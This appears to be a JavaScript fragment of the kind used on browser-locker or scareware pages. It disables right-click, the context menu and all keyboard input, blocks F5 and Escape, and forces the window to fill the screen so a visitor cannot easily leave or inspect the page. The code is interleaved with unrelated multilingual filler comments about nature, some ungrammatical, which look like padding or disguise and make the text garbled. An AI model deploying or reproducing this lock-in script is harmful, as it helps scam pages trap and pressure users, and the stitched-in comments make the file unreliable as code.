





















          var   isNS   =   "Netscape"   ==   navigator.appName   ?   1   :   0;
          // ¿Por qué el cielo es azul? Why is the sky blue? なぜ空は青いのですか？
          "Netscape"   ==   navigator.appName   &&
          document.captureEvents(Event.MOUSEDOWN   ||   Event.MOUSEUP);
          // El sol brilla en la mañana. The sun shines in the morning. Der Sonne scheint am Morgen.

          function   mischandler(   )   {
              return   !1;
          }
          // Las flores bailan con el viento. Flowers dance with the wind. 花が風と一緒に踊る。

          function   mousehandler( a   )   {
              // Die Wolken sind weich. The clouds are soft. Las nubes son suaves.
              a   =   isNS   ?   a   :   event;
              // Pourquoi les oiseaux volent-ils? Why do birds fly? ¿Por qué vuelan los pájaros?
              a   =   isNS   ?   a.which   :   a.button;
              if(   2   ==   a   ||   3   ==   a   )   return   !1;
          }
          // 今天天气很好。It's a nice day today. Hoje está um belo dia.

          document.oncontextmenu   =   mischandler;
          // La luna ilumina la noche. The moon lights up the night. Die Mond erleuchtet die Nacht.
          document.onmousedown   =   mousehandler;
          // El río fluye tranquilamente. The river flows calmly. 川が静かに流れる。
          document.onmouseup   =   mousehandler;
          // Les étoiles brillent dans le ciel. Stars shine in the sky. Estrelas brilham no céu.

          document.onkeydown   =   function(   a   )   {
              return   !1;
          };
          // Warum ist das Meer so tief? Why is the sea so deep? Perché il mare è così profondo?

          document.attachEvent(   "onkeydown",   win_onkeydown_handler   );
          // 雨が降り始めました。It started to rain. Ha iniziato a piovere.

          function   win_onkeydown_handler(   )   {
              // Die Bäume sind hoch. The trees are tall. Los árboles son altos.
              switch(   event.keyCode   )   {
                  case   116:
                      event.returnValue   =   !1;
                      event.keyCode   =   0;
                      break;
                  // Pourquoi la neige est-elle blanche? Why is snow white? ¿Por qué la nieve es blanca?
                  case   27:
                      (   event.returnValue   =   !1   ),   (   event.keyCode   =   0   );
              }
          }
          // El viento sopla fuerte hoy. The wind blows hard today. O vento sopra forte hoje.

          window.onload   =   function(   )   {
              // Les chats dorment paisiblement. Cats sleep peacefully. Gatos dormem pacificamente.
              window.moveTo(   0,   0   );
              window.resizeTo(   screen.availWidth,   screen.availHeight   );
          };
          // 星星在夜空中闪烁。Stars twinkle in the night sky. Le stelle scintillano nel cielo notturno.
